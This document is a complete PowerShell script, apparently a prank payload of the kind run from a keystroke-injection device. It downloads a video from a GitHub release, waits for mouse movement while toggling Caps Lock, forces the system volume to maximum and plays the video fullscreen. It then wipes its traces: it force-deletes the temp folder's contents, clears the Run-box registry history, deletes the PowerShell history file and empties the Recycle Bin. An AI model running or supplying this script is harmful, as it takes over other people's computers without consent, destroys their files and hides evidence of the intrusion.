
$url = "https://github.com/aaronddd/2077/releases/download/a/rr.mp4"


$destination = "$env:tmp\rr.mp4"


Invoke-WebRequest -Uri $url -OutFile $destination



function Target-Comes {
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#############################################################################################################################################


#WPF Library for Playing Movie and some components
Add-Type -AssemblyName PresentationFramework

Add-Type -AssemblyName System.ComponentModel
#XAML File of WPF as windows for playing movie

# Load the Core Audio API


# Set the sys_volume
Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;

    [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IAudioEndpointVolume {
        void _VtblGap1_6();
        void SetMasterVolumeLevelScalar(float fLevel, Guid pguidEventContext);
    }

    [Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
    class MMDeviceEnumeratorComObject { }

    public class AudioUtilities {
        [DllImport("ole32.dll")]
        public static extern int CoCreateInstance(ref Guid clsid, [MarshalAs(UnmanagedType.IUnknown)] object inner,
            uint context, ref Guid uuid, out object rReturnedComObject);

        public static IAudioEndpointVolume GetMasterVolume() {
            var enumerator = new MMDeviceEnumeratorComObject();
            object o;
            var iid = typeof(IAudioEndpointVolume).GUID;
            CoCreateInstance(ref enumerator.GetType().GUID, enumerator, 0x1,
                ref iid, out o);
            return (IAudioEndpointVolume)o;
        }
    }
"@

# Set the volume to 100%
$volume = [AudioUtilities]::GetMasterVolume()
$volume.SetMasterVolumeLevelScalar(1.0, [Guid]::Empty)





[xml]$XAML = @"
 
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="PowerShell Video Player" WindowState="Maximized" ResizeMode="NoResize" WindowStartupLocation="CenterScreen" >
        <MediaElement Stretch="Fill" Name="VideoPlayer" LoadedBehavior="Manual" UnloadedBehavior="Stop"  />
</Window>
"@
 
#Movie Path
[uri]$VideoSource = "$env:TMP\rr.mp4"
 
#Devide All Objects on XAML
$XAMLReader=(New-Object System.Xml.XmlNodeReader $XAML)
$Window=[Windows.Markup.XamlReader]::Load( $XAMLReader )
$VideoPlayer = $Window.FindName("VideoPlayer")

 
#Video Default Setting
$VideoPlayer.Volume = 100;
$VideoPlayer.Source = $VideoSource;
#$VideoPlayer.Padding = new Thickness(5);
[Audio]::Volume = 1


Target-Comes

$VideoPlayer.Play()
 
#Show Up the Window 
$Window.ShowDialog() | out-null


# Turn of capslock if it is left on

$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
if ($caps -eq $true){$key = New-Object -ComObject WScript.Shell;$key.SendKeys('{CapsLock}')}


# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
